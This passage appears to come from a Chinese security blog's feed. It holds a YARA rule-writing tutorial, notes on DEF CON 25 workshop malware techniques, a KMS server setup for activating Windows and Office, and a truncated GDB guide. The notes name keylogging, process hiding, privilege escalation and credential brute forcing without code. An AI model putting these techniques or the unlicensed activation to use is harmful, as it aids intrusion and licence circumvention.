href="https://yaofeifly.github.io/2017/09/08/Struts2-052/" target="_blank" rel="noopener">https://yaofeifly.github.io/2017/09/08/Struts2-052/</a></li><li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="noopener">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li><li>S2-053 复现分析过程(附POC)<br><a href="https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA</a></li><li>Struts 2 S2-053漏洞分析（附POC）<br><a href="http://www.freebuf.com/vuls/147735.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/147735.html</a></li><li>来自McAfee对s2-052的分析<br><a href="https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/" target="_blank" rel="noopener">https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/</a></li><li>GCC 合并了我写的代码，从编译器开始解决安全问题。来自嘶吼，作者为吴潍浠<br><a href="http://www.4hou.com/binary/7688.html" target="_blank" rel="noopener">http://www.4hou.com/binary/7688.html</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>yara使用说明</title>
      <link href="/2017/09/06/yara%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
      <url>/2017/09/06/yara%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
      <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul><li>yara工具用来帮助安全研究人员鉴别和对恶意软件进行分类的工具。我们可以通过编写规则来进行恶意软件的识别。<h4 id="yara-规则"><a href="#yara-规则" class="headerlink" title="yara 规则"></a>yara 规则</h4><a href="http://yara.readthedocs.io/en/v3.6.3/index.html" target="_blank" rel="noopener">最新规则官方文档V3.6.3</a><br><br>规则示例：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rule silent_banker : banker</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = &quot;This is just an example&quot;</span><br><span class="line">        thread_level = 3</span><br><span class="line">        in_the_wild = true</span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;</span><br><span class="line">        $b = &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;</span><br><span class="line">        $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</span><br><span class="line">    condition:</span><br><span class="line">        $a or $b or $c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这个就是一个名为rule silent_banker的规则，其中banker是规则的tag字段(可以有多个tag)，meta字段是规则的描述信息，strings是规则字段，condition则是条件判断的字段，这个规则的意思就是只要满足了字符串或a或b或c就会命中规则。<br>这里只是一个简单的规则，规则的创建可以使用通配符、大小写非敏感的字符串、正则表达式、特殊的操作符号等其它的特征。<br>通过python使用yara<br><img src="/2017/09/06/yara使用说明/yarapython.png" alt=""><br><img src="/2017/09/06/yara使用说明/help.png" alt=""><br>yara语法<br><br>silent-_banker叫做identifiers，是大小写敏感的且不能超过128个字符，且不能用以下的关键词，因为这些是yara的关键词<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allandanyasciiatconditioncontains</span><br><span class="line">entrypointfalsefilesizefullwordforglobalin</span><br><span class="line">importincludeint8int16int32int8beint16be</span><br><span class="line">int32bematchesmetanocasenotorof</span><br><span class="line">privaterulestringsthemtrueuint8uint16</span><br><span class="line">uint32uint8beuint16beuint32bewide</span><br></pre></td></tr></table></figure></p><p>字符串可以是文本字符串也可以是十六进制，ascii类型的使用双引号包裹，十六进制字符串使用大括号包裹。<br><br>注释语法和c语言相同。<br></p><p>* 三种string；<br><br>1.文本类型字符串<br><br>2.十六进制字符串<br><br>3.正则表达式</p><ul><li>十六进制Example<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule AlternativesExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">       $hex_string = &#123; F4 23 ( 62 B4 | 56 ) 45 &#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">       $hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>valid<br>F42362B445或者F4235645</p><ul><li>字符串Example<br><br>默认是敏感的,但是可以通过nocase关键字设置成不敏感的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule CaseInsensitiveTextExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $text_string = &quot;foobar&quot; nocase</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $text_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这样Foobar, FOOBAR, and fOoBaR都会被匹配到。</p><ul><li><p>宽字节的匹配<br><br>一个字符占两个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule WideCharTextExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $wide_string = &quot;Borland&quot; wide</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">       $wide_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>fullword关键词<br><br>rule WideCharTextExample1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $fullword_string = &quot;domain&quot; fullword</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">       $fullword_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>www.mydomain.com  www.my-domain.com www.domain.com</p><ul><li>正则表达式<br><br>使用斜线包裹，而非双引号或者大括号。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> rule RegExpExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $re1 = /md5: [0-9a-fA-F]&#123;32&#125;/</span><br><span class="line">        $re2 = /state: (on|off)/</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $re1 and $re2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/09/06/yara使用说明/rerule.png" alt=""></p><ul><li><p>条件判断语句Conditions<br><br>可以没有特征strings但是不能没有strings字段<br><br>可以设定特征出现的次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> rule CountExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &quot;dummy1&quot;</span><br><span class="line">        $b = &quot;dummy2&quot;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        #a == 6 and #b &gt; 10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>偏移地址offset</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule InExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &quot;dummy1&quot;</span><br><span class="line">        $b = &quot;dummy2&quot;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a in (0..100) and $b in (100..filesize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>特征a出现在0-0x100偏移且特征b出现在0x100之后。</p><ul><li>文件大小<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> rule FileSizeExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">       filesize &gt; 200KB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这个只能匹配文件，如果是运行着的程序的话，那么将永远不会匹配，因为这个时候filesize没有意义。</p><ul><li>特定位置的数据获取<br>PE文件的判断<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> rule IsPE</span><br><span class="line">&#123;</span><br><span class="line">  condition:</span><br><span class="line">     // MZ signature at offset 0 and ...</span><br><span class="line">     uint16(0) == 0x5A4D and</span><br><span class="line">     // ... PE signature at offset stored in MZ header at 0x3C</span><br><span class="line">     uint32(uint32(0x3C)) == 0x00004550</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>PE文件结构中的前两个字节是DOS签名5A4D,即“MZ”。</p><ul><li><p>特征集合<br>rule OfExample1<br>{<br>strings:</p><pre><code>$a = &quot;dummy1&quot;$b = &quot;dummy2&quot;$c = &quot;dummy3&quot;</code></pre><p>condition:</p><pre><code>2 of ($a,$b,$c)</code></pre><p>}<br>满足两个特征即可</p></li></ul></li><li><p>引用其他规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rule Rule1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &quot;dummy1&quot;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule Rule2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &quot;dummy2&quot;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a and Rule1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>全局规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">global rule SizeLimit</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        filesize &lt; 2MB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>规则标签<br>方便对输出的信息进行归类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule TagsExample1 : Foo Bar Baz</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule TagsExample2 : Bar</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Metadata</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rule MetadataExample</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        my_identifier_1 = &quot;Some string data&quot;</span><br><span class="line">        my_identifier_2 = 24</span><br><span class="line">        my_identifier_3 = true</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $my_text_string = &quot;text here&quot;</span><br><span class="line">        $my_hex_string = &#123; E2 34 A1 C8 23 FB &#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $my_text_string or $my_hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>模块引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &quot;pe&quot;</span><br><span class="line"></span><br><span class="line">rule Test</span><br><span class="line">&#123;</span><br><span class="line">  strings:</span><br><span class="line">      $a = &quot;some string&quot;</span><br><span class="line"></span><br><span class="line">  condition:</span><br><span class="line">      $a and pe.entry_point == 0x1000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>文件包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;other.yar&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul><li>容易踩坑的点<br>当进程扫描的时候，这时是没有filesize属性的，也就永远不会满足的。此外还有通过文件偏移来判断PE也是不可行的。</li><li>web<br><a href="https://github.com/Tigzy/yaraeditor" target="_blank" rel="noopener">https://github.com/Tigzy/yaraeditor</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="http://www.freebuf.com/articles/system/26373.html" target="_blank" rel="noopener">恶意软件模式匹配利器 – YARA</a><br><a href="http://www.freebuf.com/articles/96903.html" target="_blank" rel="noopener">YARA：抗击恶意代码的神兵利器</a><br><a href="https://www.aldeid.com/wiki/Pescanner" target="_blank" rel="noopener">PEScanner</a><br><a href="https://github.com/Neo23x0/yarGen" target="_blank" rel="noopener">yara规则自动生成</a><br><a href="https://countuponsecurity.com/tag/pescanner-py/" target="_blank" rel="noopener">UNLEASHING YARA – PART 2</a><br><a href="http://www.freebuf.com/sectool/92399.html" target="_blank" rel="noopener">教你构建自己的yara数据库</a><br><a href="https://github.com/Neo23x0/yarAnalyzer" target="_blank" rel="noopener">yarAnalyzer</a><br><a href="http://www.aptno1.com/YC/249.html" target="_blank" rel="noopener">yara简介及API解析</a><br><a href="http://blog.csdn.net/wowolook/article/details/44307283" target="_blank" rel="noopener">两个开源恶意代码的查杀引擎 clamav yara</a><br><a href="http://bruteforcelab.com/yara-a-beginners-guide.html" target="_blank" rel="noopener">http://bruteforcelab.com/yara-a-beginners-guide.html</a><br><a href="https://blog.malwarebytes.com/threat-analysis/2013/10/using-yara-to-attribute-malware/" target="_blank" rel="noopener">https://blog.malwarebytes.com/threat-analysis/2013/10/using-yara-to-attribute-malware/</a><br><a href="https://securityintelligence.com/signature-based-detection-with-yara/" target="_blank" rel="noopener">https://securityintelligence.com/signature-based-detection-with-yara/</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>defcon-25-workshop代码解读 partII</title>
      <link href="/2017/08/31/defcon-25-workshop%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%AF%BB-partII/"/>
      <url>/2017/08/31/defcon-25-workshop%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%AF%BB-partII/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个项目还是比较有意义的，里面会有一些值得借鉴的函数，比网上现找的质量好些。</span><br></pre></td></tr></table></figure><ul><li><p>11.locklogger - injects into winlogon.exe and keylogs  注入winlogon.exe以及键盘记录<br>dll注入winlogon并进行键盘记录，这里的关键点应该是dll注入winlogon进程<br><a href="http://blog.csdn.net/suppercoder/article/details/17167537" target="_blank" rel="noopener">关于win7的session0隔离的总结</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用OutputDebugStringA()函数可以将调试信息输出，然后用debugview工具进行查看。</span><br><span class="line">ANSI的ASCII字符集及其派生字符集（也称多字节字符集）比较旧，Unicode字符集比较新，固定以双字节表示一个字。</span><br><span class="line">操作字符串的API在声明时，会指定字符集。每个含有字符串的API同时有两个版本：即ANSI，Unicode。尾部带A的API是ANSI版本，带W的API是Unicode版本。例如：SetWindowTextA，是ANSI函数；而SetWindowTextW，是Unicode函数.</span><br><span class="line">_tmain()是unicode版本的的main()</span><br><span class="line">VS注释与取消注释快捷键</span><br><span class="line">CTRL + K , CTRL + C(注释)</span><br><span class="line">CTRL + K , CTRL + U(取消注释)</span><br></pre></td></tr></table></figure></li><li><p>12.puppetstrings - take a free ride into ring 0<br>ring0层实现进程隐藏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个还是比较有意思的</span><br></pre></td></tr></table></figure></li><li><p>13.ThreadContinue - injection using SetThreadContext() and NtContinue()<br>反射型dll注入，利用SetThreadContext() and NtContinue()进行dll注入。</p></li><li><p>14.getsystem - gets system using Named Pipe impersonation<br>利用服务管理程序sc获取system权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关于sc介绍可以看这里https://technet.microsoft.com/en-us/library/bb490995.aspx</span><br></pre></td></tr></table></figure></li><li><p>15.steamroll - brute forces login credentials<br><img src="/2017/08/31/defcon-25-workshop代码解读-partII/1.png" alt=""><br>爆破登录信息，代码量比较大，加入了av，之前看到过一个非常简单的爆破代码，利用的是LogonUser()函数。</p></li><li>16.combrowser - using IE COM object to make web requests<br>使用IE COM对象发送web请求</li><li>17.httpbrowser - using HTTP API to make web requests<br>自己实现了一个http发包的方法。</li><li>18.toxicserpent - log all network traffic, poison, port knock C2<br>流量日志</li><li>19.RunShellcode - run shellcode from .NET<br>一个run shellcode的GUI小工具 c#写的</li><li><p>20.offsetfix - converting static analysis offsets with ASLR</p></li><li><p>21.rawhook - simple example showing function prologue hooking</p></li><li><p>22.wmiquery - shows how to look up AV using WMI<br>使用wmi查询AV</p></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>可激活windows和office的KMS服务搭建</title>
      <link href="/2017/08/26/%E5%8F%AF%E6%BF%80%E6%B4%BBwindows%E5%92%8Coffice%E7%9A%84KMS%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"/>
      <url>/2017/08/26/%E5%8F%AF%E6%BF%80%E6%B4%BBwindows%E5%92%8Coffice%E7%9A%84KMS%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>碍于windows激活工具存在后门的情况，搭建一个kms服务器的方法倒是不错，也是朋友推荐的。<br>然后网上搜索了一下。<br>KMS(Key Management Service) .这个功能是在windows Vista中的Enterprise版本和Windows Server 2008中首次出现的一种新型产品激活机制，目的是为了Microsoft更好的“反盗版”。<br><a href="https://baike.baidu.com/item/KMS/66195" target="_blank" rel="noopener">摘自百度</a></li><li>github上开源了一个kms服务器的源码，<a href="https://github.com/Wind4/vlmcsd" target="_blank" rel="noopener">link</a><br>想深入研究原理的可以分析一下源码。<h4 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h4></li></ul><ol><li>一般安装在linux服务上，我的是安装在ubuntu服务器上的，安装脚本如下<br><a href="https://raw.githubusercontent.com/Wind4/vlmcsd/211e463ddd71f5df884080ce98d0fc5eb369b51f/scripts/install.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/Wind4/vlmcsd/211e463ddd71f5df884080ce98d0fc5eb369b51f/scripts/install.sh</a></li><li>安装完成后 vlmcsd -h 看一下所支持的命令<br>kms 默认的端口是1688，当然也可以自定义端口，参数是 -P</li><li>这个时候可以参考说明进行激活了,注意:自定义了端口的需要在host后面加上自定义的端口<br><a href="https://github.com/Wind4/vlmcsd/tree/211e463ddd71f5df884080ce98d0fc5eb369b51f" target="_blank" rel="noopener">https://github.com/Wind4/vlmcsd/tree/211e463ddd71f5df884080ce98d0fc5eb369b51f</a><br><a href="https://wwww.lvmoo.com/archives/517.html" target="_blank" rel="noopener">https://wwww.lvmoo.com/archives/517.html</a></li><li>注 windows7 ultimate 旗舰版 没有对应的KMS Client Setup Key,建议安全windows7 professional 专业版  </li></ol>]]></content>
      
      <categories>
          
          <category> 其它 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux调试工具GDB入门</title>
      <link href="/2017/08/24/linux%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7GDB%E5%85%A5%E9%97%A8/"/>
      <url>/2017/08/24/linux%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7GDB%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>gdb可以用在代码调试和反汇编代码的调试</p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>调用gdb编译需要在cc后面加 -g参数再加-o；<br>[root@redhat home]#gdb 调试文件：启动gdb<br>(gdb) l ：（字母l）从第一行开始列出源码<br>(gdb) break n :在第n行处设置断点<br>(gdb) break func：在函数func()的入口处设置断点<br>(gdb) info break： 查看断点信息<br>(gdb) r：运行程序<br>(gdb) n：单步执行<br>(gdb) c：继续运行<br>(gdb) p 变量 ：打印变量的值<br>(gdb) bt：查看函数堆栈<br>(gdb) finish：退出函数<br>(gdb) shell 命令行：执行shell命令行<br>(gdb) set args 参数:指定运行时的参数<br>(gdb) show args：查看设置好的参数<br>(gdb) show paths:查看程序运行路径；<br>           set environment varname [=value] 设置环境变量。如：set env USER=hchen；<br>            show environment [varname] 查看环境变量；<br>(gdb) cd 相当于shell的cd;<br>(gdb)pwd ：显示当前所在目录<br>(gdb)info program： 来查看程序的是否在运行，进程号，被暂停的原因。<br>(gdb)clear 行号n：清除第n行的断点<br>(gdb)delete 断点号n：删除第n个断点<br>(gdb)disable 断点号n：暂停第n个断点<br>(gdb)enable 断点号n：开启第n个断点<br>(gdb)step：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</p><p>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。<br>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12<br>list 函数名：将显示“函数名”所在函数的源代码，如：list main<br>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。<br>注意 ：如果运行list 命令得到类似如下的打印，那是因为在编译程序时没有加入 -g 选项：<br>(gdb) list<br>1       ../sysdeps/i386/elf/start.S: No such file or directory.<br>        in ../sysdeps/i386/elf/start.S</p><p>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。<br>回车：重复上一条命令。<br>set args：设置运行程序时的命令行参数，如：set args 33 55<br>show args：显示命令行参数<br>continue：简讯为 c ，其作用是继续运行被断点中断的程序。<br>break：为程序设置断点。<br>break 行号：在当前文件的“行号”处设置断点，如：break  33<br>break 函数名：在用户定义的函数“函数名”处设置断点，如：break cb_button<br>info breakpoints：显示当前程序的断点设置情况<br>disable breakpoints Num：关闭断点“Num”，使其无效，其中“Num”为 info breakpoints 中显示的对应值<br>enable breakpoints Num：打开断点“Num”，使其重新生效<br>step：简记为 s ，单步跟踪程序，当遇到函数调用时，则进入此函数体（一般只进入用户自定义函数）。<br>next：简记为 n，单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。<br>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。<br>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。<br>stepi或nexti：单步跟踪一些机器指令。<br>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。<br>print a：将显示整数 a 的值<br>print ++a：将把 a 中的值加1,并显示出来<br>print name：将显示字符串 name 的值<br>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数<br>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数<br>bt：显示当前程序的函数调用堆栈。<br>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a<br>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a<br>kill：将强行终止当前正在调试的程序<br>help 命令：help 命令将显示“命令”的常用帮助信息<br>call 函数(参数)：调用“函数”，并传递“参数”，如：call  gdb_test(55)<br>layout：用于分割窗口，可以一边查看代码，一边测试：<br>layout src：显示源代码窗口<br>layout asm：显示反汇编窗口<br>layout regs：显示源代码/反汇编和CPU寄存器窗口<br>layout split：显示源代码和反汇编窗口<br>Ctrl + L：刷新窗口<br>quit：简记为 q ，退出gdb</p><h4 id="内存查看"><a href="#内存查看" class="headerlink" title="内存查看"></a>内存查看</h4><ul><li><p>可以使用 examine 命令(简写是 x)来查看内存地址中的值。x 命令的语法如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/&lt;n/f/u&gt; &lt;addr&gt;</span><br></pre></td></tr></table></figure></li><li><p>n、f、u 是可选的参数。</p></li><li>n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。</li><li>f 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是 s，如果地十是指令地址， 那么格式可以是 i。</li><li>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。u 参数可以用下 面的字符来代替，b 表示单字节，h 表示双字节，w 表示四字节，g 表示八字节。当我们指定了字节长度后， GDB 会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</li><li><addr>表示一个内存地址。</addr></li><li>n/f/u三个参数可以一起使用。例如:命令:x/3uh 0x54320 表示，从内存地址 0x54320 读取内容，h表示以双字节为一个单位，3 表 示三个单位，u表示按十六进制显示。</li><li>常用的组合例如 x/100xh  第一个x代表examine 第二个x代表hexadecimal，h代表半个word即两个字节<h4 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h4>首先我们使用gcc -g命令对代码进行编译  generates debug information to be used by GDB debugger.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 